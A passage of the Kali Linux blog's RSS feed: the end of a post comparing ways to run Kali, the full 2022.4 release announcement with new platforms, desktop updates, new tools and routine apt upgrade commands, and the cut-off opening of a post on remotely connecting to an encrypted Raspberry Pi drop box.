<li><strong>Cloud</strong>: A fairly popular way of using Kali. The images are kept bare-bones so it is easy to only use what is needed. Useful for short or long lived instances, and especially useful for remote pentests. If you need to work remote, try out a cloud system.</li> <li><strong>Containers</strong>: There is a growing popularity for containers. Containers are not a complete replacement for virtual machines, however the ability to run a full traditional Kali desktop environment out of them is not something to discount. Especially useful for Apple Silicon users as virtual machines are still not quite as easy to use as on traditional architectures. If you need to quickly get a port scan setup and ran, go with a container.</li> <li><strong>WSL</strong>: A very useful feature of modern Windows systems. While there is not enough ways to acquire WSL to warrant a column on the table, do check it out under the virtual machines category. WSL in its current form operates on the back end as an integrated virtual machine but presents itself as a highly integrated solution allowing you to run Kali apps alongside your traditional Windows apps. We have a number of deep customization options such as Win-Kex to make this as easy as possible. WSL is useful for daily Windows users. If you are thinking of using a container or a virtual machine, but are on Windows, try WSL instead.</li> <li><strong>USB</strong>: Live boot is a more dated method of using Kali that is becoming less popular over time. You can choose between standard live boot, where all data is stored in ram and wiped when the machine is powered off, or a persistence mode, where data will be written to the USB drive. This is especially useful for repairing machines, investigating potential harmful programs installed to a machine, or keeping a personalized Kali instance around to be used on different computers. If you aren&rsquo;t quite sure if you want to use Kali yet, a USB may be the way to go.</li> <li><strong>ARM (Single Board Computer)</strong>: An important platform to Kali from the start, ARM Single Board Computer devices serve quite a lot of purposes. Able to be used as daily computers or a remote access system, ARM devices are quite versatile. Especially useful for &ldquo;leave behind&rdquo; systems. Go with an ARM device if you want something inexpensive but reliable.</li> <li><strong>Mobile (NetHunter)</strong>: This is a super fun solution that allows you to run Kali from your Android mobile device. A modern phone is a great platform for executing any number of traditional attacks or unique items that only make sense from a mobile device such as pretending to be a keyboard or network device when plugged into a computer. Especially useful for a more low profile setting. If you aren&rsquo;t able to carry around a laptop or don&rsquo;t want to drop an ARM device, NetHunter will be there.</li> </ul> <hr> <h2 id="pros-and-cons">Pros and Cons</h2> <p>Each way to interact with Kali will have its own pros and cons. Going over all of them would be impossible, but we can lay out some of the most obvious.</p> <p><strong>Installations</strong>:</p> <ul> <li>Pros: Familiar, very customizable, able to be dual-booted</li> <li>Cons: Takes up a large amount of hard drive space</li> </ul> <p><strong>Virtual Machines</strong>:</p> <ul> <li>Pros: Familiar, quick and easy to create, can utilize snapshots, variable hard drive size</li> <li>Cons: Slower than a bare-metal install, difficult to get direct access to hardware</li> </ul> <p><strong>Cloud</strong>:</p> <ul> <li>Pros: Easy to create and delete, able to use anywhere, collaboration is easy</li> <li>Cons: Reliance on an external resources, potentially slower due to connection speeds, potential additional running costs</li> </ul> <p><strong>Containers</strong>:</p> <ul> <li>Pros: Lightweight, very customizable, easy to create and delete, can run in the background</li> <li>Cons: Restrictions involving software and hardware, can be unstable the larger the container gets</li> </ul> <p><strong>USB</strong>:</p> <ul> <li>Pros: Easy to carry around, utilizes all system resources, fully customizable, small form factor, can be used to recover a system</li> <li>Cons: Slower than a bare-metal install</li> </ul> <p><strong><a href="https://arm.kali.org/">ARM (Single Board Computer)</a></strong>:</p> <ul> <li>Pros: Lightweight, small form factor, low power consumption, easy to carry around, cheap</li> <li>Cons: Generally less system resources, not all software is available for ARM</li> </ul> <p><strong><a href="https://nethunter.kali.org/">Mobile (NetHunter)</a></strong>:</p> <ul> <li>Pros: Is a phone, able to access a desktop environment, low profile, easy to carry around, useful preloaded attacks</li> <li>Cons: Small display, for a full experience it requires a rooted Android device, may require external hardware such as keyboards or Wi-Fi cards</li> </ul> <hr> <h2 id="closing-thoughts">Closing thoughts</h2> <p>Before completely wrapping up it may be helpful to point out a few of the most popular ways of using Kali and the image that would work best, for those who may want advice or examples.</p> <p><strong>Daily driver</strong> - Use the installer image and single boot Kali. With the <a href="https://www.kali.org/docs/">docs</a> and our <a href="https://forums.kali.org/">forums</a> you will be able to use Kali daily just fine with no worries. Be sure to follow the <a href="https://www.kali.org/docs/installation/barebone-kali/">barebones</a> install method!</p> <p><strong>Professional pentester</strong> - Most likely you will be wanting to use the cloud images or a virtual machine. While installing bare-metal is a possibility, the frequency of having to wipe the system or re-install to protect client data may prove tiresome.</p> <p><strong>Hobbyist or student</strong> - A virtual machine is almost always going to be the way to go for these situations. ARM and Nethunter will also be fun to explore. Bare-metal installs are recommended against due to the potential of &ldquo;<a href="https://techterms.com/definition/bricking">bricking</a>&rdquo; installs from inexperience.</p> <p>To restate it, you won&rsquo;t find a singular &ldquo;right&rdquo; way to interact with Kali, you have to determine what works best for you. We hope to have provided enough information for you to determine what will work best for you and understand what drawbacks may come with that solution. If not, then you can always come ask in our <a href="https://discord.kali.org/">Discord server</a>!</p></description>
</item>
<item>
<title>Kali Linux 2022.4 Release (Azure, Social & Kali NetHunter Pro)</title>
<link>https://www.kali.org/blog/kali-linux-2022-4-release/</link>
<guid isPermaLink="true">https://www.kali.org/blog/kali-linux-2022-4-release/</guid>
<pubDate>Tue, 06 Dec 2022 00:00:00 +0000</pubDate>
<enclosure url="https://www.kali.org/blog/kali-linux-2022-4-release/images/banner-2022.4-release.jpg" type="image/jpg"/>
<description><p>Before the year is over, we thought it was best to get the final 2022 release out. Today we are publishing <strong>Kali Linux 2022.4</strong>. This is ready for immediate <a href="https://www.kali.org/get-kali/">download</a> or <a href="https://www.kali.org/docs/general-use/updating-kali/">updating</a> existing installations.</p> <p>A summary of the <a href="https://bugs.kali.org/changelog_page.php">changelog</a> since <a href="https://www.kali.org/blog/kali-linux-2022-3-release/">August&rsquo;s 2022.3 release</a>:</p> <ul> <li><strong><a href="https://www.kali.org/blog/kali-linux-2022-4-release/#microsoft-azure">Microsoft Azure</a></strong> - We are back on the Microsoft Azure store</li> <li><strong><a href="https://www.kali.org/blog/kali-linux-2022-4-release/#more-platforms">More Platforms</a></strong> - Generic Cloud, QEMU VM image &amp; Vagrant libvirt</li> <li><strong><a href="https://www.kali.org/blog/kali-linux-2022-4-release/#social-networks">Social Networks</a></strong> - New homes, keeping in touch &amp; press packs</li> <li><strong><a href="https://www.kali.org/blog/kali-linux-2022-4-release/#kali-nethunter-pro-release">Kali NetHunter Pro</a></strong> - Announcing the first release of a &ldquo;true&rdquo; Kali Linux on the mobile phone (PinePhone / Pro)</li> <li><strong><a href="https://www.kali.org/blog/kali-linux-2022-4-release/#kali-nethunter-update">Kali NetHunter</a></strong> - Internal Bluetooth support, kernel porting video, firmware updates &amp; other improvements</li> <li><strong><a href="https://www.kali.org/blog/kali-linux-2022-4-release/#desktop-updates">Desktop Updates</a></strong> - GNOME 43 &amp; KDE 5.26</li> <li><strong><a href="https://www.kali.org/blog/kali-linux-2022-4-release/#new-tools-in-kali">New Tools</a></strong> - As always, various new packages added</li> </ul> <hr> <h2 id="microsoft-azure">Microsoft Azure</h2> <p>Its been a long time coming, but we are very happy to announce that Kali has been added to <a href="https://azuremarketplace.microsoft.com/en/marketplace/apps/kali-linux.kali">Microsoft Azure</a> (again - and this time to stay)! <a href="https://www.kali.org/blog/kali-linux-2020-4-release/">Following in the foot steps</a> of our <a href="https://aws.amazon.com/marketplace/pp/B08LL91KKB">Amazon AWS</a> image, we are using the same <a href="https://gitlab.com/kalilinux/build-scripts/kali-cloud">kali-cloud build-scripts</a> now to automate publishing to Microsoft Azure store.</p> <p>Out of the box, <em>currently</em>, there is no graphical user interface, or any tools pre-installed. Should you want the default toolset (<code>kali-linux-default</code>) or any other combination of <a href="https://www.kali.org/docs/general-use/metapackages/">metapackages</a>, it should be like any other Kali platform. For installing a desktop environment, we have the following kali-docs page: <a href="https://www.kali.org/docs/general-use/xfce-with-rdp/">Setting up RDP with Xfce</a></p> <p>We hope in 2023 we can revisit this again and are looking at doing ARM64 architecture, as well as different variations of images, allowing you to choose from a mixture of headless bare-bones install, the traditional environment, and a mixture of everything in-between.</p> <h2 id="more-platforms">More Platforms</h2> <p>We are now including a <strong>QEMU</strong> image with our <a href="https://www.kali.org/get-kali/">pre-generated images</a>. We hope this makes it easier for the people who use self-hosted Proxmox Virtual Environments (VE), <a href="https://pkg.kali.org/pkg/virt-manager">virt-manager</a>, or <a href="https://pkg.kali.org/pkg/libvirt">libvirt</a>!</p> <p>On that subject, <a href="https://gitlab.com/elreydetoda">elrey (alex)</a> from the community has added libvirt support to our <a href="https://gitlab.com/kalilinux/build-scripts/kali-vagrant">kali-vagrant build-script</a>.</p> <p>In Kali 2022.3, we have produced a <strong>Generic Cloud</strong> image. The idea of this image is that it should work in &ldquo;most&rdquo; cloud providers This is coming from our <a href="https://gitlab.com/kalilinux/build-scripts/kali-cloud">kali-cloud build-scripts</a>. So if you are self-hosting OpenStack, this is a great way of getting Kali loaded up!</p> <h2 id="social-networks">Social Networks</h2> <p>We have expanded the social networks which we post on, as well as refreshing the current ones. As a recap:</p> <ul> <li>Facebook: <a href="https://www.facebook.com/KaliLinux/">facebook.com/KaliLinux</a></li> <li><strong>NEW</strong> Instagram: <a href="https://www.instagram.com/kalilinux/">instagram.com/KaliLinux</a></li> <li><strong>NEW</strong> Mastodon: <a href="https://infosec.exchange/@kalilinux">@kalilinux@infosec.exchange</a></li> <li>Twitter: <a href="https://twitter.com/kalilinux">twitter.com/KaliLinux</a></li> </ul> <p>As a reminder, we don&rsquo;t use social networks for technical support - you can receive community support via <a href="https://discord.kali.org/">discord</a> or our <a href="https://forums.kali.org/">forums</a> and bug reports should go to the <a href="https://bugs.kali.org/">bug tracker</a>! Instead, we automatically post <a href="https://www.kali.org/blog/">blog posts</a> thus <em>these accounts are mostly unmonitored!</em></p> <p>If social networks are not your thing, you can also keep in touch via:</p> <ul> <li>Email: <a href="https://www.kali.org/newsletter/">Newsletter</a></li> <li>RSS: <a href="https://www.kali.org/rss.xml">kali.org/rss.xml</a></li> </ul> <hr> <h3 id="press-pack">Press Pack</h3> <p>We have also taken the time to create a <strong>Press Pack</strong> <em>(aka Press kit)</em> for Kali. Here you can find all our product media resources to use, including:</p> <ul> <li>Logomark (our dragon logos)</li> <li>Logomark and Wordmark (our iconic avatars - dragon logo with text)</li> <li>Wordmark (text as an image)</li> <li>Various different image formats (png, svg, jpg)</li> <li>Official colours</li> </ul> <p><em>Please bear in mind that they are under <a href="https://www.kali.org/docs/policy/trademark/">copyright &amp; trademark</a> when using them!</em></p> <p>You can <a href="https://gitlab.com/kalilinux/documentation/press-pack/-/archive/main/press-pack-main.zip">download them all</a>, or you can <a href="https://gitlab.com/kalilinux/documentation/press-pack/-/tree/main/">view them online</a>.</p> <p style="text-align:center"> <a href="https://gitlab.com/kalilinux/documentation/press-pack/-/tree/main/Kali/Logomark_and_Wordmark"><img src="https://www.kali.org/blog/kali-linux-2022-4-release/images/kali-logo-dragon-blue-transparent.png" alt="Kali Linux" style="display:inline;height:150px"></a> <a href="https://gitlab.com/kalilinux/documentation/press-pack/-/tree/main/Kali_NetHunter/Logomark_and_Wordmark"><img src="https://www.kali.org/blog/kali-linux-2022-4-release/images/kali-nethunterpro-logo-dragon-orange-transparent.png" style="display:inline;height:150px"></a> <a href="https://gitlab.com/kalilinux/documentation/press-pack/-/tree/main/Kali_NetHunter_Pro/Logomark_and_Wordmark"><img src="https://www.kali.org/blog/kali-linux-2022-4-release/images/kali-nethunter-logo-dragon-grey-transparent.png" style="display:inline;height:150px"></a> </p> <hr> <h3 id="media-enquiries">Media Enquiries</h3> <p>And on the subject, we do have a page for <a href="https://www.kali.org/contact/">Press and Media enquiries</a>.</p> <h2 id="kali-nethunter-pro-release">Kali NetHunter Pro Release</h2> <p><p> <a href='https://www.kali.org/blog/kali-linux-2022-4-release/images/NetHunterPro.png'> <img src="https://www.kali.org/blog/kali-linux-2022-4-release/images/NetHunterPro.png" alt="" /> </a> </p> </p> <p>We are very excited to announce the official support of the Pine64 PinePhone and PinePhone Pro thanks to the amazing work of <a href="https://twitter.com/Shubhamvis98">Shubham Vishwakarma</a> and the vibrant community.</p> <p>The launch of Kali NetHunter Pro is the beginning of a new chapter for Kali Linux and NetHunter, a bare metal installation of Kali Linux with Phosh desktop environment, optimized for mobile devices.</p> <p>First of all we make available SD card images for the PinePhone and the PinePhone Pro to dual boot alongside the main OS. Soon we will release alternative versions with Plasma Mobile as well as installers so you can install Kali NetHunter Pro onto the internal flash memory.</p> <p>For all those that have a PinePhone or a PinePhone Pro, hop over to our <a href="https://www.kali.org/get-kali/#kali-mobile">download page</a> and join the brave new world of mobile hacking. For those that don&rsquo;t have a PinePhone yet: What are you waiting for? Get one :-)</p> <p>Please help us with the development by testing the images, submitting bugs and improvements in our <a href="https://gitlab.com/kalilinux/nethunter/build-scripts/kali-nethunter-pro">GitLab repository</a>, and become a part of the vibrant Kali NetHunter community.</p> <h2 id="kali-nethunter-update">Kali NetHunter Update</h2> <p><strong>Internal Bluetooth support</strong> has finally arrived, thanks to <a href="https://twitter.com/yesimxev">@yesimxev</a> and the awesome <a href="https://www.kali.org/community/">community</a>! We have added support to some <a href="https://nethunter.kali.org/image-stats.html">devices</a> already, however as each <a href="https://nethunter.kali.org/kernels.html">kernel</a> needs new Bluetooth drivers enabled, it takes time to rebuild each of them. You are more than welcome to <a href="https://www.kali.org/docs/nethunter/nethunter-kernel-2-config-1/">contribute</a> if your device is Kali NetHunter supported already without the new drivers.</p> <p><a href="https://twitter.com/yesimxev">@yesimxev</a> has released the ultimate <a href="https://www.youtube.com/watch?v=FwSHbZqY88k"><strong>Kali NetHunter Complete Kernel Porting Guide</strong></a>. Have you ever dreamt of porting Kali NetHunter to your device but didn&rsquo;t know where to start? This video has it all so get cracking.</p> <div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;"> <iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen="allowfullscreen" loading="eager" referrerpolicy="strict-origin-when-cross-origin" src="https://www.kali.org/blog/kali-linux-2022-4-release/https://www.youtube-nocookie.com/embed/FwSHbZqY88k?autoplay=0&controls=1&end=0&loop=0&mute=0&start=0" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" title="YouTube video" ></iframe> </div> <p>Wardriving has been updated with bugfixes, <a href="https://www.kali.org/docs/nethunter/nethunter-btarsenal/">Bluetooth</a>, RTL-SDR, and MouseJack support. That&rsquo;s good news for <strong>QCACLD-3.0 users (most devices out there)</strong> as you will be able to use <strong>wardriving with internal wireless and Bluetooth chipsets</strong>, if OTG adapters are not an option.</p> <p><a href="https://www.kali.org/docs/nethunter/nethunter-kex-manager/">KeX</a> also received the status fix along with audio support. Now you can play any audio in KeX session.</p> <p>Wireless firmware has been updated, and Magisk firmware flashing is now patched.</p> <p>Android 11/12 crashing when starting the <a href="https://www.kali.org/docs/nethunter/#kali-nethunter-application">Kali NetHunter app</a> has also been fixed with this release.</p> <p>Last but not least, let&rsquo;s welcome the <strong>OnePlus 6t</strong>, <strong>Pixel 4a 5g</strong> and <strong>Realme 5 Pro</strong> devices to the list of the <strong>Android 12</strong> supported <a href="https://nethunter.kali.org/kernel-stats.html">devices</a>.</p> <h2 id="desktop-updates">Desktop Updates</h2> <p>Both the <a href="https://www.kali.org/blog/kali-linux-2022-4-release/#gnome">GNOME</a> and <a href="https://www.kali.org/blog/kali-linux-2022-4-release/#kde-plasma">KDE Plasma</a> desktops have received a major version bump.</p> <h3 id="gnome">GNOME</h3> <p>For people who opt to use GNOME as their desktop environment, <a href="https://release.gnome.org/43/"><strong>GNOME 43</strong></a> is now in Kali! If you do not read their changelog, below is a quick summary mixed with some of our tweaks:</p> <ul> <li><strong>Shell updates</strong>, including a new quick settings panel and an improved theme. Unfortunately, we had to say goodbye to the extension <strong>proxyswitcher</strong>, as it was no longer compatible with this new release</li> <li>Continues the <strong>migration of multiple programs to GTK4</strong> with the libadwaita library. The previous text editor (<code>gedit</code>) has been replaced with the brand new <code>gnome-text-editor</code>, which includes an updated Kali color-scheme theme.</li> <li>New <strong>GTK3 theme based on the adw-gtk3</strong> project with Kali&rsquo;s tweaks, which brings a fresh look, and makes the interface coherent between the different GUI libraries. With it, GTK3-based programs don&rsquo;t seem out of place with the recently introduced libadwaita-based ones.</li> </ul> <p><p> <a href='https://www.kali.org/blog/kali-linux-2022-4-release/images/gnome-43.png'> <img src="https://www.kali.org/blog/kali-linux-2022-4-release/images/gnome-43.png" alt="" /> </a> </p> </p> <h3 id="kde-plasma">KDE Plasma</h3> <p>Kali now includes the new version 5.26 of KDE, which improves the overall desktop experience, and brings tweaks for multiple widgets. You can learn more about the latest changes in the <a href="https://kde.org/announcements/plasma/5/5.26.0/"><strong>Plasma 5.26</strong> release announcement</a> publication.</p> <div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;"> <iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen="allowfullscreen" loading="eager" referrerpolicy="strict-origin-when-cross-origin" src="https://www.kali.org/blog/kali-linux-2022-4-release/https://www.youtube-nocookie.com/embed/tTM3s1Zl8p0?autoplay=0&controls=1&end=0&loop=0&mute=0&start=0" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" title="YouTube video" ></iframe> </div> <h2 id="miscellaneous">Miscellaneous</h2> <p>Below is a quick list of minor updates:</p> <ul> <li>The Kali dragon logo is now in <a href="https://www.nerdfonts.com/cheat-sheet">nerd-fonts</a> (<code>f327</code> aka <code>nf-linux-kali_linux</code>).</li> <li>We are aware of a bug with the installation using speech synthesiser. <ul> <li>As a work around, you can use <a href="https://cdimage.kali.org/kali-2022.2/">Kali 2022.2</a>, and <a href="https://www.kali.org/docs/general-use/updating-kali/">upgrade</a>.</li> <li>We will put out a message on <a href="https://www.kali.org/blog/kali-linux-2022-4-release/#social-networks">social networks</a> when to grab the weekly images with the fix.</li> </ul> </li> <li>We are aware of a bug with Metasploit-framework and libssl1.1/OpenSSL v3. As a result, there are issues with payloads using <code>*/*/reverse_https</code>. <ul> <li>We will address this as quickly as we can.</li> <li>We will put out a message on <a href="https://www.kali.org/blog/kali-linux-2022-4-release/#social-networks">social networks</a> when to grab the weekly images with the fix.</li> </ul> </li> <li>RSS feed for torrents! <a href="https://www.kali.org/torrents.xml">kali.org/torrents.xml</a>. <ul> <li>If your client supports it, you can use regex then to filter out which image you prefer:</li> </ul> </li> </ul> <p><p> <a href='https://www.kali.org/blog/kali-linux-2022-4-release/images/torrents.png'> <img src="https://www.kali.org/blog/kali-linux-2022-4-release/images/torrents.png" alt="" /> </a> </p> </p> <h2 id="new-tools-in-kali">New Tools in Kali</h2> <p>It would not be a Kali release if there were not any new tools added! A quick run down of what has been added <em>(to the network repositories)</em>:</p> <ul> <li><a href="https://www.kali.org/tools/bloodhound.py/">bloodhound.py</a> - A Python based ingestor for BloodHound</li> <li><a href="https://www.kali.org/tools/certipy-ad/">certipy</a> - Tool for Active Directory Certificate Services enumeration and abuse</li> <li><a href="https://www.kali.org/tools/hak5-wifi-coconut/">hak5-wifi-coconut</a> - A user-space driver for USB Wi-Fi NICs and the Hak5 Wi-Fi Coconut</li> <li><a href="https://www.kali.org/tools/python-ldapdomaindump/">ldapdomaindump</a> - Active Directory information dumper via LDAP</li> <li><a href="https://www.kali.org/tools/peass-ng/">peass-ng</a> - Privilege escalation tools for Windows and Linux/Unix* and MacOS. </li> <li><a href="https://www.kali.org/tools/rizin-cutter/">rizin-cutter</a> - reverse engineering platform powered by rizin</li> </ul> <p><em>This is new tools, there are numerous updates to existing tools.</em></p> <h2 id="kali-arm-updates">Kali ARM Updates</h2> <p>We are happy to say that Kali has been added to <a href="https://www.raspberrypi.com/software/">Raspberry Pi Imager</a> (<code>rpi-imager</code>), making it even easier to flash Kali to your SDs <em>(as long as you can buy an RPi!)</em>. We have also written up <a href="https://www.kali.org/docs/arm/using-rpi-imager-to-write-raspberry-pi-images/">a quick guide</a> on it.</p> <p><p> <a href='https://www.kali.org/blog/kali-linux-2022-4-release/images/rpi-imager.png'> <img src="https://www.kali.org/blog/kali-linux-2022-4-release/images/rpi-imager.png" alt="" /> </a> </p> </p> <p>The Kali user&rsquo;s sudoers edit is now its own file in <code>/etc/sudoers.d</code> and users should no longer be prompted on what to do when an update for sudo comes in. This change does not occur on an upgrade, only fresh installs.</p> <p>The <a href="https://www.kali.org/docs/arm/usb-armory-mkii/">USBArmory MKII</a> has had the u-boot bootloader bumped to 2022.10.</p> <p>The build-script for the <a href="https://www.kali.org/docs/arm/cubox/">ODROID-C2</a> has been fixed and should now properly create images again. Thanks to <a href="https://gitlab.com/Beekhuizen">M Beekhuizen</a> for reporting the issue.</p> <p><a href="https://www.kali.org/docs/arm/radxa-zero-emmc/">Radxa Zero</a> images created from the build-scripts should now have firmware to support the wireless card on newer models (1.51+). Thanks to Stefan Lehner (from Discord) for reporting the issue.</p> <p><a href="https://www.kali.org/docs/arm/pinebook-pro/">Pinebook Pro</a> images have firmware to support the new wireless card on more recent models. Thanks to <a href="https://gitlab.com/dravenwolfgang">Jonathan Cox</a> for reporting the issue.</p> <p>The <a href="https://gitlab.com/kalilinux/build-scripts/kali-arm">kali-arm build-scripts</a> got a big makeover, thanks to <a href="https://gitlab.com/Arszilla">Arszilla</a> for putting in the work to do this.</p> <h2 id="kali-documentation-updates">Kali Documentation Updates</h2> <p>Our <a href="https://www.kali.org/docs/">kali-docs</a> has had various updates to existing pages as well as the following new pages:</p> <ul> <li><a href="https://www.kali.org/docs/arm/using-rpi-imager-to-write-raspberry-pi-images/">Using the Raspberry Pi Imager software to write Kali Raspberry Pi Images</a></li> <li><a href="https://www.kali.org/docs/cloud/azure/">Azure</a></li> <li><a href="https://www.kali.org/docs/introduction/kali-linux-image-overview/">Kali Linux Image Overview</a></li> <li><a href="https://www.kali.org/docs/nethunter/nethunter-set/">NetHunter Social Engineer Toolkit</a></li> <li><a href="https://www.kali.org/docs/virtualization/customizing-kali-vagrant/">Customizing a Kali Vagrant Vagrantfile</a></li> <li><a href="https://www.kali.org/docs/virtualization/install-proxmox-guest-vm/">Kali inside Proxmox (Guest VM)</a></li> <li><a href="https://www.kali.org/docs/virtualization/running-kali-vm-windows/">Running Kali Linux as a Virtual Machine in Windows</a></li> <li><a href="https://www.kali.org/docs/wsl/wsl-preparations/">Preparing a system for WSL</a></li> </ul> <p>Thank you for their work!</p> <ul> <li><a href="https://gitlab.com/2hexed">@2hexed</a></li> <li><a href="https://gitlab.com/fabfianda-gitlab">Fabrizio Fiandanese</a></li> <li><a href="https://gitlab.com/jelmer">Jelmer Vernooij</a></li> <li><a href="https://gitlab.com/JesseRotenberg">Jesse Rotenberg</a></li> <li><a href="https://gitlab.com/isopach">Koh You Liang</a></li> <li><a href="https://gitlab.com/m.01001101.01010110">@OW87</a></li> <li><a href="https://gitlab.com/rclev4sec">@Rclev4Sec</a></li> <li><a href="https://gitlab.com/yesimxev">@yesimxev</a></li> </ul> <h2 id="recent-kali-blog-posts">Recent Kali Blog Posts</h2> <p>Recapping our <a href="https://www.kali.org/blog/">blog posts</a> since the last release:</p> <ul> <li><a href="https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/">Community Showcase: Raspberry Pi Zero W P4wnP1 A.L.O.A.</a></li> <li><a href="https://www.kali.org/blog/kali-community-themes/">Kali Community Themes</a></li> <li><a href="https://www.kali.org/blog/remotely-accessing-secure-kali-raspberry-pi/">Remotely Accessing Secure Kali Pi</a></li> </ul> <h2 id="community-shout-outs">Community Shout-Outs</h2> <p>There have been various contributions since our release. Thank you guys! Out of these, a few people&rsquo;s actions have helped make a significant improvement to Kali, so giving them credit:</p> <ul> <li><a href="https://gitlab.com/alexhenrie">Alex Henrie</a> - Fixed a long-standing issue with the prompt in the Docker images, thanks so much!</li> <li><a href="https://twitter.com/arszilla">Arszilla</a> - Kali ARM and i3-gap work</li> <li>&ldquo;Fred Sheehan&rdquo; on the Kali-forums - Super helpful, great poster!</li> <li><a href="https://gitlab.com/Shubhamvis98">Shubham Vishwakarma</a> - Bringing Kali to the PinePhone!</li> </ul> <p>Anyone can help out, anyone can get <a href="https://www.kali.org/docs/community/contribute/">involved</a>!</p> <hr> <h2 id="discord-chat">Discord Chat</h2> <p>The next <a href="https://discord.kali.org/">Kali Discord</a> session will happen a week after the release, <strong>Tuesday, 13th December 2022 16:00 -&gt; 17:00 <a href="https://time.is/UTC">UTC/+0 GMT</a></strong>.</p> <p><em>Please note, we will not be recording these sessions. These are live sessions only.</em></p> <h2 id="get-kali-linux-20224">Get Kali Linux 2022.4</h2> <p><strong>Fresh Images</strong>: So what are you waiting for? Go <a href="https://www.kali.org/get-kali/">get Kali</a> already!</p> <p>Seasoned Kali Linux users are already aware of this, but for the ones who are not, we do also produce <strong><a href="https://cdimage.kali.org/kali-images/kali-weekly/">weekly builds</a></strong> that you can use as well. If you cannot wait for our next release and you want the latest packages <em>(or bug fixes)</em> when you download the image, you can just use the weekly image instead. This way you will have fewer updates to do. <em>Just know that these are automated builds that we do not QA like we do our standard <a href="https://www.kali.org/releases/">release images</a></em>. But we gladly take <a href="https://bugs.kali.org/">bug reports</a> about those images because we want any issues to be fixed before our next release!</p> <p><strong>Existing Installs</strong>: If you already have an existing Kali Linux installation, remember you can always do a quick <a href="https://www.kali.org/docs/general-use/updating-kali/">update</a>:</p> <pre><code class="language-console">+--(kali?kali)-[~] +-$ echo &quot;deb http://http.kali.org/kali kali-rolling main contrib non-free&quot; | sudo tee /etc/apt/sources.list [...] +--(kali?kali)-[~] +-$ sudo apt update &amp;&amp; sudo apt -y full-upgrade [...] +--(kali?kali)-[~] +-$ cp -vrbi /etc/skel/. ~ [...] +--(kali?kali)-[~] +-$ [ -f /var/run/reboot-required ] &amp;&amp; sudo reboot -f </code></pre> <p>You should now be on Kali Linux 2022.4 We can do a quick check by doing:</p> <pre><code class="language-console">+--(kali?kali)-[~] +-$ grep VERSION /etc/os-release VERSION=&quot;2022.4&quot; VERSION_ID=&quot;2022.4&quot; VERSION_CODENAME=&quot;kali-rolling&quot; +--(kali?kali)-[~] +-$ uname -v #1 SMP PREEMPT_DYNAMIC Debian 6.0.7-1kali1 (2022-11-07) +--(kali?kali)-[~] +-$ uname -r 6.0.0-kali3-amd64 </code></pre> <p><em>NOTE: The output of <code>uname -r</code> may be different depending on the system <a href="https://pkg.kali.org/pkg/linux">architecture</a>.</em></p> <p>As always, should you come across any bugs in Kali, please submit a report on our <a href="https://bugs.kali.org/">bug tracker</a>. <em>We will never be able to fix what we do not know is broken!</em></p></description>
</item>
<item>
<title>Remotely Accessing Secure Kali Pi</title>
<link>https://www.kali.org/blog/remotely-accessing-secure-kali-raspberry-pi/</link>
<guid isPermaLink="true">https://www.kali.org/blog/remotely-accessing-secure-kali-raspberry-pi/</guid>
<pubDate>Mon, 28 Nov 2022 00:00:00 +0000</pubDate>
<enclosure url="https://www.kali.org/blog/remotely-accessing-secure-kali-raspberry-pi/images/remotely-accessing-secure-kali-pi.jpg" type="image/jpg"/>
<description><p>In <a href="https://www.kali.org/blog/secure-kali-raspberry-pi/">Secure Kali Pi (2022)</a>, the first blog post in the Raspberry Pi series, we set up a <a href="https://www.kali.org/docs/arm/raspberry-pi-4/">Raspberry Pi 4</a> with full disk encryption. We mentioned that we can leave it somewhere as a drop box. This brought up the question, &ldquo;<strong>If it is not on my local network how do I connect to it to unlock it?</strong>&rdquo; So we will now answer this by showing a few different ways to connect to our secure Kali Pi drop box. This includes:</p> <ul> <li><a href="https://www.kali.org/blog/remotely-accessing-secure-kali-raspberry-pi/#wireless-80211">Wireless 802.11</a>: <ul> <li>As a <a href="https://www.kali.org/blog/remotely-accessing-secure-kali-raspberry-pi/#wi-fi---client-mode">client on an existing network(s)</a> <em>(only if we know any details ahead of time to pre-configure)</em></li> <li>Create an <a href="https://www.kali.org/blog/remotely-accessing-secure-kali-raspberry-pi/#wi-fi---access-point">access point</a>, to become a new network <em>(that we can access if we are in physical distance to the device)</em></li> </ul> </li> <li><a href="https://www.kali.org/blog/remotely-accessing-secure-kali-raspberry-pi/#wired-connection">Wired ethernet</a>: <ul> <li>Using static network settings <em>(if we know the details ahead of time to pre-configure it)</em></li> <li>DHCP to automatically discover network values <em>(which creates noise)</em></li> </ul> </li> </ul> <p>After getting internet access, we will use a <strong><a href="https://www.kali.org/blog/remotely-accessing-secure-kali-raspberry-pi/#vpn-connection">Virtual Private Network</a></strong> to remotely connect back to a server of our choosing, which we can also join from anywhere online, thus getting around the requirements of having to port forward on any firewalls.</p> <hr> <h2 id="ingredients">Ingredients</h2> <ul> <li><input disabled="" type="checkbox"> Drop box - Raspberry Pi 4 <ul> <li><em>Pre-configured as of our <a href="https://www.kali.org/blog/secure-kali-raspberry-pi/">Secure Kali Pi</a> blog post</em></li> </ul> </li> <li><input disabled="" type="checkbox"> Wi-Fi - We will be using the on-board wireless adapter (to make the device as compact as possible for our drop box) <ul> <li>However if the performance is not sufficient for your needs, an external compatible wireless adapter may give greater range</li> </ul> </li> <li><input disabled="" type="checkbox"> External server - A pre-created &amp; harden OpenVPN service <ul> <li><em>Creating this is out-of-scope for this blog post</em></li> </ul> </li> </ul> <hr> <h2 id="pre-config-wireless-80211">Pre-Config Wireless 802.11</h2> <h3 id="overview">Overview</h3> <p>While wired networking in the initramfs does not require a lot of extras, wireless has a few more moving parts. To enable wireless support, we need to find:</p> <ul> <li>The kernel <a href="https://www.kali.org/blog/remotely-accessing-secure-kali-raspberry-pi/#wi-fi-modules">Wi-Fi <strong>modules</strong></a> that need to be in the initramfs <em>(Depends on hardware)</em></li> <li>The <a href="https://www.kali.org/blog/remotely-accessing-secure-kali-raspberry-pi/#wi-fi-firmware">Wi-Fi <strong>firmware</strong></a> files that need to be in the initramfs <em>(Depends on hardware)</em></li> <li>The <a href="https://www.kali.org/blog/remotely-accessing-secure-kali-raspberry-pi/#interface-name">Wireless <strong>interface name</strong></a> <em>(Kali defaults to: 